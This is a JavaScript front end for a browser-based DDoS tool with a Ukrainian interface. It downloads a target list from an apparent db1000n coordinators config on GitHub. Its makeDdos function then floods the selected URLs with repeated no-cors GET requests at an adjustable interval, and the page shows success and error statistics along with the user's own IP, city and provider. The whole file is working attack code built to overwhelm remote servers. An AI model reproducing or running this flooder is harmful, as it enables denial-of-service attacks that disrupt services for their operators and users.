let ipApi = "http://ip-api.com/json/?fields=61439",
	targetLink = "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json",
	targets = [],
	attacketTargets = [],
	contry = "",
	count = 5,
	interval = 1000,
	sucPercent = 0,
	errPercent = 0,
	waitPercent = 0,
	lightModeBtn = document.getElementById("lightModeCheckBox"),
	intervalRange = document.getElementById("interval"),
	intervalText = document.getElementById("intervalText"),
	counterRange = document.getElementById("targetCounter"),
	counterText = document.getElementById("counterText"),
	startBtn = document.getElementById("startAtackBtn"),
	// statistic
	listWraper = document.getElementById("dataWraper"),
	diagram = document.getElementById("diagram"),
	errCir = document.getElementById("errCir"),
	waitCir = document.getElementById("waitCir"),
	waitbar = document.getElementById("waitBar"),
	waitText = document.getElementById("dataWait"),
	errBar = document.getElementById("errBar"),
	errText = document.getElementById("dataErr"),
	sucCir = document.getElementById("sucCir"),
	sucBar = document.getElementById("sucBar"),
	sucText = document.getElementById("dataSuc");
getTargets = function (a) {
	fetch(targetLink)
		.then((responce) => {
			return responce.json();
		})
		.then((data) => {
			data["jobs"].forEach((k, i) => {
				try {
					if (k.args.request.path) {
						targets.push({ host: k.args.request.path, err: 0, suc: 0, count: 0, queryStatus: true });
					}
				} catch (err) {
					console.log(err);
				}
			});
			counterRange.setAttribute("max", targets.length);
		})
		.catch((err) => {
			console.log(err);
			alert("Невдалося завантажити цілі спробуйте пізніше");
		});
	a();
};
getTargets(getLocatioInfo);
function getLocatioInfo() {
	let locationContainer = document.getElementById("conectionInfo");
	setInterval(getLocatioInfo, 60000);
	fetch(ipApi)
		.then((responce) => {
			return responce.json();
		})
		.then((data) => {
			locationContainer.innerHTML = `<p class="main-desc"> Ваша країна ${data.country}</p>
			<p class="main-desc">Ваше місто ${data.city}</p>
			<p class="main-desc">Ваш провайдер ${data.org}</p>
			<p class="main-desc"> Ваша IP адреса ${data.query}</p>`;
		})
		.catch((err) => {
			console.log(err);
			alert("Неможливо отримати інформацію про ваше підключення");
		});
}

counterRange.addEventListener("input", (e) => {
	count = e.target.value;
	selectTargets(count);
});
function selectTargets(a = count) {
	counterText.textContent = a;
	attacketTargets = [];
	for (let i = 0; i < a; i++) {
		attacketTargets.push(targets[i]);
	}
	if (startBtn.classList.contains("clicked")) {
		makeDdos();
	}
}
intervalRange.addEventListener("input", (e) => {
	interval = e.target.value;
	intervalText.textContent = interval;
	selectTargets(count);
	makeDdos();
});
startBtn.addEventListener("click", (e) => {
	selectTargets(count);
	makeDdos();
	e.target.classList.add("clicked");
});
function makeDdos() {
	setInterval(() => {
		attacketTargets.forEach((k, i) => {
			k.count++;
			fetch(k.host, {
				method: "GET",
				mode: "no-cors",
				cache: "no-cache",
				headers: { "Referrer-Policy": "no-referrer" },
			})
				.then((responce) => {
					k.suc++;
				})
				.catch((err) => {
					k.queryStatus = false;
					k.err++;
					console.log(err);
				});
		});
		drawStatistic();
	}, interval);
}
function drawStatistic() {
	diagram.setAttribute("viewBox", "0 0 " + diagram.clientWidth + " " + diagram.clientHeight);
	let radius = sucCir.getBoundingClientRect().height / 2;
	let circulance = 2 * Math.PI * radius;
	setInterval(() => {
		let itemsList = "",
			mainErr = 0,
			mainWait = 0,
			mainSuc = 0,
			mainQuer = 0;
		attacketTargets.forEach((k) => {
			let errStatus = "suc";
			if (k.queryStatus !== true) {
				errStatus = "err";
			}
			((itemsList += `<li class="target-item ${errStatus}">
			<span class="data-link">${k.host}</span>
			<span class="data-suc">${k.count}</span>
			<span class="data-err">${k.suc}</span>
			<span class="data-sum">${k.err}</v>
		</li>`),
			(mainErr = k.err + mainErr)),
				(mainSuc = k.suc + mainSuc),
				(mainQuer = k.count + mainQuer),
				(mainWait = mainQuer - (mainSuc + mainErr));
		});
		listWraper.innerHTML = itemsList;
		itemsList = "";
		// draw list

		sucPercent = (mainSuc / mainQuer) * 100;
		waitPercent = (mainWait / mainQuer) * 100;
		errPercent = (mainErr / mainQuer) * 100;
		sucBar.style.width = sucPercent + "%";
		sucText.textContent = Math.round(sucPercent);
		waitBar.style.width = waitPercent + "%";
		waitText.textContent = Math.round(waitPercent);
		errBar.style.width = errPercent + "%";
		errText.textContent = Math.round(errPercent);
		// draw diagram
		diagram.setAttribute("viewBox", `0 0 ${diagram.clientWidth} ${diagram.clientHeight}`);
		sucCir.style.strokeDasharray = (sucPercent * circulance) / 100 + ` ${circulance - (sucPercent * circulance) / 100}`;
		sucCir.style.stroke = "rgb(161, 255, 172)";
		waitCir.style.strokeDashoffset = "-" + (sucPercent * circulance) / 100;
		waitCir.style.strokeDasharray = (waitPercent * circulance) / 100 + ` ${circulance - (waitPercent * circulance) / 100}`;
		waitCir.style.stroke = "rgb(191, 191, 191)";

		errCir.style.strokeDashoffset = -circulance + (errPercent * circulance) / 100;
		errCir.style.strokeDasharray = (errPercent * circulance) / 100 + ` ${circulance - (errPercent * circulance) / 100}`;
		errCir.style.stroke = "rgb(254, 113, 113)";
		// sanitaizeTarget();
	}, 1000);
}
// function sanitaizeTarget() {
// 	let liveTargets = [];
// 	attacketTargets.forEach((k, i) => {
// 		if (k.err < 10) {
// 			liveTargets.push(k);
// 		}
// 	});
// 	attacketTargets = liveTargets;
// 	if (attacketTargets.length < count) {
// 		for (let i = count; i < attacketTargets.length; i++) {
// 			attacketTargets.push(targets[i]);
// 			console.log(targets[i]);
// 		}
// 		makeDdos();
// 	}
// }
lightModeBtn.addEventListener("click", () => {
	document.body.classList.toggle("dark");
});
